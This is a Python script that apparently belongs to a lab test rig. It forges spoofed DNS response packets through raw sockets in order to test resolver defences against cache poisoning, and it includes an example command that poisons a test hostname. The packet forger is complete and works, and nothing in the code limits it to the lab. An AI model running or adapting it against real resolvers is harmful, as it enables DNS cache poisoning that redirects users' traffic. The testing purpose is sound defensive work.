#!/usr/bin/env python3
"""spoof.py -- off-path spoofed-DNS-response injector for the review rig.

Runs INSIDE the `attacker` namespace of the VM. Forges a UDP DNS *response*
with an arbitrary source IP (e.g. the fake root/leaf server's address) aimed at
one of the resolvers, to exercise cache-poisoning / response-spoofing defences
(txid + source-port matching, bailiwick checks, etc.).

Needs raw-socket privilege (root in the VM). Example -- forge a poisoned answer
for host.example.test aimed at unbound, pretending to come from the leaf NS:

    ip netns exec attacker python3 /opt/dnsenv/spoof.py \
        --dst-ip 10.53.0.3 --dst-port 5301 \
        --src-ip 10.53.0.12 \
        --qname host.example.test --answer-ip 6.6.6.6 --txid 0x1234

Because it is off-path it does not see the real txid/source-port, so a correct
resolver rejects the forgery -- which is exactly what the review checks.
"""
import argparse, socket, struct, sys

def checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i + 1]
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF

def encode_name(name: str) -> bytes:
    out = b""
    for label in name.rstrip(".").split("."):
        out += bytes([len(label)]) + label.encode()
    return out + b"\x00"

def build_dns(txid: int, qname: str, answer_ip: str) -> bytes:
    flags = 0x8180          # QR=1, AA=1, RD=1, RA=1, rcode=0
    header = struct.pack(">HHHHHH", txid, flags, 1, 1, 0, 0)
    q = encode_name(qname) + struct.pack(">HH", 1, 1)          # A, IN
    ans = (struct.pack(">H", 0xC00C)                            # ptr to qname
           + struct.pack(">HHIH", 1, 1, 300, 4)                # A, IN, ttl, rdlen
           + socket.inet_aton(answer_ip))
    return header + q + ans

def build_udp(src_ip, dst_ip, sport, dport, payload):
    length = 8 + len(payload)
    udp = struct.pack(">HHHH", sport, dport, length, 0)
    pseudo = socket.inet_aton(src_ip) + socket.inet_aton(dst_ip) \
        + struct.pack(">BBH", 0, 17, length)
    csum = checksum(pseudo + udp + payload)
    udp = struct.pack(">HHHH", sport, dport, length, csum)
    return udp + payload

def build_ip(src_ip, dst_ip, payload):
    total = 20 + len(payload)
    ihl_ver = (4 << 4) | 5
    hdr = struct.pack(">BBHHHBBH4s4s", ihl_ver, 0, total, 0x1234, 0,
                      64, 17, 0, socket.inet_aton(src_ip),
                      socket.inet_aton(dst_ip))
    csum = checksum(hdr)
    hdr = struct.pack(">BBHHHBBH4s4s", ihl_ver, 0, total, 0x1234, 0,
                      64, 17, csum, socket.inet_aton(src_ip),
                      socket.inet_aton(dst_ip))
    return hdr + payload

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--dst-ip", required=True, help="resolver IP to poison")
    p.add_argument("--dst-port", type=int, required=True)
    p.add_argument("--src-ip", required=True, help="spoofed source (server) IP")
    p.add_argument("--src-port", type=int, default=53)
    p.add_argument("--qname", required=True)
    p.add_argument("--answer-ip", required=True, help="the poisoned A record")
    p.add_argument("--txid", default="0x0000",
                   help="guessed transaction id, e.g. 0x1234")
    a = p.parse_args()
    txid = int(a.txid, 0)

    dns = build_dns(txid, a.qname, a.answer_ip)
    udp = build_udp(a.src_ip, a.dst_ip, a.src_port, a.dst_port, dns)
    pkt = build_ip(a.src_ip, a.dst_ip, udp)

    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.sendto(pkt, (a.dst_ip, a.dst_port))
    print(f"sent spoofed response: src={a.src_ip}:{a.src_port} -> "
          f"{a.dst_ip}:{a.dst_port}  txid={txid:#06x}  "
          f"{a.qname} A {a.answer_ip}")

if __name__ == "__main__":
    sys.exit(main())
